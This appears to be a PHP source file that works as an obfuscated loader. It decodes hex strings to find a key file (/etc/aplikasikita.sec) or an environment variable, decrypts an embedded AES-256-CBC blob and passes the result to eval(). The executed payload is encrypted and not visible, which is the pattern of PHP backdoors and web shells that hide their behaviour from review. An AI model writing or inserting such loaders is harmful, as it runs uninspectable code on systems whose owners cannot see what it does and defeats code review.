<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+B3XTU2QwL93uGdH/Kz9cg==');

$c=base64_decode(

'QKKSZvDD8/i4fv2xd+HJt/Ww/hJISzVnJ0pfTNK7fykcU9sPHEtT1mYtmB3/Bpwvl975PIyj3NAv' .
'CNP6tdxm5Ip3XPwbQUpp7j4cApJeeQerjUhA4X3wX6MALVoAlfx5JIL96MJDeRn7HKWHgRWU4Svy' .
'1W9SSsB+2fianPGRqwoAJlGJjTiHN4vfIeG/CIRKnlYKQzGeoofYeZqHRiAhtlUNMWj+5vf6LAMu' .
'RZF47k0rITv2aebkcpVKOEHQzbNLUxvki/xKf5dWLnu79HwwTI+5HTcD20i/M04O/EmvhJMG+EB5' .
'QSa5Rwc5jTrcVFydBORCnvtPA2Fj8sHDaJbKzxykxDpYzL13RYU98/1SWLlnbqoZ68Q+BgaUOl8g' .
'yZVz6aZ4J/mkggGqu1KrPkQ7AUi0QxG4wZ8EocKuQDgIEoDb082GbePWy7SCY1dDjStVafBIpJTd' .
'T3yMWz7KihGcD/Mnm2z9mVGjv1ZF01BdG4YlUUy8KlKwWgK5ukCmuXKyLHpmkQSOYZgbTO+UfRU/' .
'D+r6ZZ9YFRO2n7Wg6yo4ptA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

